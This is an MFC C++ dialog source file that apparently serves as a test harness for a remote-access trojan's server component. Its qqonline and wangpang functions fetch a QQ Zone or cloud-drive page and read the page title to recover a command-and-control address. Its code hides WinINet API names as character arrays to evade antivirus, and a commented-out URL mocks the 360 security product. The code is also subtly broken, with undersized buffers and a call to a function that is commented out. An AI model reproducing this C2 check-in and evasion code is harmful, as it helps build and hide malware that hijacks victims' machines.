// testDlg.cpp : implementation file
//

#include "stdafx.h"
#include "test.h"
#include "testDlg.h"

#include <tlhelp32.h>
#include <io.h>
#include <Shlobj.h>
#include <shellapi.h>
#include <string.h> 
#include "wininet.h"
#import "msxml2.dll"

//#include "../Server/common/KernelManager.h"
//#include "../Server/common/KeyboardManager.h"
//#include "../Server/common/login.h"
#include "../Server/Declare.h"   //动态调用库函数
#include "../Server/Myfunction.h"  //自定义函数
#include "../Server/common/install.h"
#include "../common/CPub.h"

Myfunction *Gyfunction;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CTestDlg dialog

CTestDlg::CTestDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CTestDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CTestDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CTestDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CTestDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CTestDlg, CDialog)
	//{{AFX_MSG_MAP(CTestDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
	ON_BN_CLICKED(IDC_BUTTON3, OnButton3)
	ON_BN_CLICKED(IDC_BUTTON4, OnButton4)
	ON_BN_CLICKED(IDC_BUTTON5, OnButton5)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CTestDlg message handlers

BOOL CTestDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CTestDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CTestDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CTestDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


char   *substr(char   *str,int   istar,int   iend) 
{  
	char   *p; 
	char   p1[100]={0}; 
	int   ip=0; 
	
    p=str; 
    ip=strlen(p); 
    if(istar> ip) 
		return   NULL; 
    else 
    { 
		p+=istar-1; 
    } 
    int   ipp=strlen(p); 
    if(ipp <iend) 
		strcpy(p1,p); 
    else 
    { 
        //p1+=iend; 
		Gyfunction->my_memcpy(p1,p,iend); 
    }
	strcpy(str,p1);
    return   str; 
	
} 


int ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)Gyfunction->my_strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		Gyfunction->my_strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)Gyfunction->my_strstr(sSrc, sMatchStr);
	}
	free(FindPos);
	return 0;
}

char	*lpszQQ = NULL;
BOOL qqonline(LPCTSTR str)    //QQ	上线
{
	///////////////////////////////上线ip的获取//////////////////////////////////////
	
	using namespace MSXML2;//使用msxml2命名空间
	CoInitialize(NULL);//初始化com组建
	
	try
	{
		IXMLHTTPRequestPtr xmlrequest;// 创建一个IXMLHTTPRequestPtr智能指针
		xmlrequest.CreateInstance("Msxml2.XMLHTTP");//冲组建中得到所需的借口,组建也就相当与一个工厂,里面提供了很多个借口,我们只要输入需要的接口名就能获得哪个对象
		_variant_t varp(false);
		char abc[50]="http://user.qzone.qq.com/";
		strcat(abc,str);
		xmlrequest->open(_bstr_t("GET"),_bstr_t(abc),varp);// 初始化即将发送的头部信息
		xmlrequest->send(); // 发送到服务器
		BSTR bstrbody;
		xmlrequest->get_responseText(&bstrbody);// 获得服务器的反馈信息
		_bstr_t bstrtbody(bstrbody);// 把bstrbody强制转换成_bstr_t类型的数据
		
		char	chBuff1[300*1024];    //获取到的内容  
		strcpy(chBuff1,(LPCTSTR)bstrtbody);

		DWORD SizePoint;
		SizePoint = memfind(chBuff1,"<title>", sizeof(chBuff1), 0);
		
		substr(chBuff1,SizePoint+8,40);
		
		int i = memfind(chBuff1, "[http", sizeof(chBuff1), 0);
		if(i != -1)
			substr(chBuff1, 1, i);

		ReplaceStr(chBuff1," ","");
		//ReplaceStr(chBuff1,"[","");
		//ReplaceStr(chBuff1,"h","");
		//ReplaceStr(chBuff1,"t","");
		//ReplaceStr(chBuff1,"p","");
		
		lpszQQ=chBuff1;
	}
	catch(...)
	{
		
	}
	CoUninitialize();//反初始化com组建库
	
	return true;
}


char	*lpszWP = NULL;

/////////////////////////////////////////////////////////

BOOL wangpang(LPCTSTR str)   //网盘上线
{
	///////////////////////////////上线ip的获取//////////////////////////////////////
	
	//	 char	lpurl[256]="http://fuck360safe.ys168.com";
	char lpurl[256];
	strcpy(lpurl,str);
	//	 CString strURL;
	// CString strID,strPwd,strPath;
	char	chBuff[300*1024];    //获取到的内容  
	
	char DYrEN04[] = {'I','n','t','e','r','n','e','t','O','p','e','n','A','\0'};
	InternetOpenAT pInternetOpenA=(InternetOpenAT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN04);
	DWORD	dwBytesRead=5000;
	HINTERNET	hNet;
	HINTERNET	hFile;
	hNet = pInternetOpenA("Internet Explorer 7.0", 
		
		PRE_CONFIG_INTERNET_ACCESS, NULL, INTERNET_INVALID_PORT_NUMBER, 0);  //获取当前网络连接句柄
	if (hNet == NULL)   //初始化失败
	{
		return 0;
	}
	
	char DYrEN03[] = {'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A','\0'};
	InternetOpenUrlAT pInternetOpenUrlA=(InternetOpenUrlAT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN03);
	hFile = pInternetOpenUrlA(hNet, 
		lpurl, 
		NULL, 0, 
		INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 
		0);  //获取URL句柄
	if (hFile == NULL)  //没获取到URL句柄
	{
		return 0;
	}
	memset(chBuff, 0, sizeof(chBuff));	//memset内存初始化
	
	char HrFvD18[] = {'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0'};
	InternetReadFileT pInternetReadFile=(InternetReadFileT)GetProcAddress(LoadLibrary("WININET.dll"),HrFvD18);
	pInternetReadFile(hFile, chBuff, sizeof(chBuff), &dwBytesRead);
	DWORD SizePoint;
	SizePoint = memfind(chBuff,"<title>",sizeof(chBuff),0);
	
	substr(chBuff,SizePoint+8,15);
	
	ReplaceStr(chBuff,"<","");
	ReplaceStr(chBuff,"/","");
	ReplaceStr(chBuff,"t","");
	ReplaceStr(chBuff,"i","");
	ReplaceStr(chBuff,"l","");
	
	lpszWP=chBuff;
	return true;
}


void CTestDlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	CString s1;
	CString s2;
	//GetDlgItemText(IDC_EDIT2, s1);
	s1 = "287378376";
	qqonline(s1);
	s2 += s1 + "	" + lpszQQ + "\r\n";

	s1 = "398853602";
	qqonline(s1);
	s2 += s1 + "	" + lpszQQ + "\r\n";

	s1 = "254851528";
	qqonline(s1);
	s2 += s1 + "	" + lpszQQ + "\r\n";

	GetDlgItem(IDC_EDIT1)->SetWindowText(s2);
	//MessageBox(lpszQQ , "", MB_OK);
}


void CTestDlg::OnButton2() 
{
	// TODO: Add your control notification handler code here
	wangpang("");    //网盘上线
	GetDlgItem(IDC_EDIT1)->SetWindowText(lpszWP);
}

void CTestDlg::OnButton3() 
{
	// TODO: Add your control notification handler code here
	char *s="0123456789012345678901234567890";
	void *p;
	p = memchr(s,'5',10);
	GetDlgItem(IDC_EDIT1)->SetWindowText((char *)p);
}


int Split(CString source, CStringArray& dest, CString division)
{
	int i_count=0;
    dest.RemoveAll();
    int pos = 0;
    int pre_pos = 0;
    while( -1 != pos ){
        pre_pos = pos;
        pos = source.Find(division,(pos+1));
        dest.Add(source.Mid(pre_pos,(pos-pre_pos)));
		i_count++;
    }
	return i_count;
}


void CTestDlg::OnButton4() 
{
	CString s1 = "abc;123;ddd;2222";
	CStringArray s2;
	int i = Split(s1,s2,";");
	CString s4;
	s4.Format("%d", i);

	CString s3;
	s3 = s1 + "\r\n";
	s3 += s4 + "\r\n";
	TRACE("%d\n", i);
	for (int j=0;j<i;j++)
	{
		TRACE(s2[j] + '\n');
		s3 += s2[j] + "\r\n";
	}
	//s3 += s2[j] + "\r\n";
	SetDlgItemText(IDC_EDIT1, s3);
}
/*
int getSplitLen(LPCTSTR s1, char c1)
{
	int len=0;
	int i=0;
	int j=strlen(s1);
	int k=0;			//char index
	for (i=0;i<j;i++)
	{
		if(s1[i] == c1)
		{
			len++;
			k=i;
		}
	}
	if(k+1<j) len++;
	return len;
}

void getSplit(LPCTSTR s1, char c1, int i_index, char* s2)
{
	int len=0;
	int i=0;
	int j=strlen(s1);
	int k=0;			//char index
	
	for (i=0;i<j;i++)
	{
		if(s1[i] == c1)
		{
			len++;
			continue;
		}

		if (len == i_index)
		{
			s2[k] = s1[i];
			k++;
		}
		if (len > i_index)
			break;
	}
	s2[k] = 0;
}
*/
void CTestDlg::OnButton5() 
{
	// TODO: Add your control notification handler code here
	LPCTSTR s="hello world! 1234 abcd";
	char c2[100];
	int i_len = 0;
	int i=0;
	
	i_len = getSplitLen(s,' ');
	TRACE("len=%d\n", i_len);

	CString s3;
	s3 = (CString)s + "\r\n";
	CString s4;
	s4.Format("%d", i_len);
	s3 += s4 + "\r\n";
	
	for (i=0;i<i_len;i++)
	{
		getSplit(s,' ',i,c2);
		TRACE("%s\n", c2);
		s3 += (CString)c2 + "\r\n";
	}

	//test2
	s="abcd;1234";
	i_len = getSplitLen(s,';');
	TRACE("len=%d\n", i_len);
	
	s3 += (CString)s + "\r\n";
	s4.Format("%d", i_len);
	s3 += s4 + "\r\n";
	
	for (i=0;i<i_len;i++)
	{
		getSplit(s,';',i,c2);
		TRACE("%s\n", c2);
		s3 += (CString)c2 + "\r\n";
	}

	
	//test3
	s="abcd;";
	i_len = getSplitLen(s,';');
	TRACE("len=%d\n", i_len);
	
	s3 += (CString)s + "\r\n";
	s4.Format("%d", i_len);
	s3 += s4 + "\r\n";
	
	for (i=0;i<i_len;i++)
	{
		getSplit(s,';',i,c2);
		TRACE("%s\n", c2);
		s3 += (CString)c2 + "\r\n";
	}

	//test4
	s="abcd";
	i_len = getSplitLen(s,';');
	TRACE("len=%d\n", i_len);
	
	s3 += (CString)s + "\r\n";
	s4.Format("%d", i_len);
	s3 += s4 + "\r\n";
	
	for (i=0;i<i_len;i++)
	{
		getSplit(s,';',i,c2);
		TRACE("%s\n", c2);
		s3 += (CString)c2 + "\r\n";
	}

	SetDlgItemText(IDC_EDIT1, s3);
}
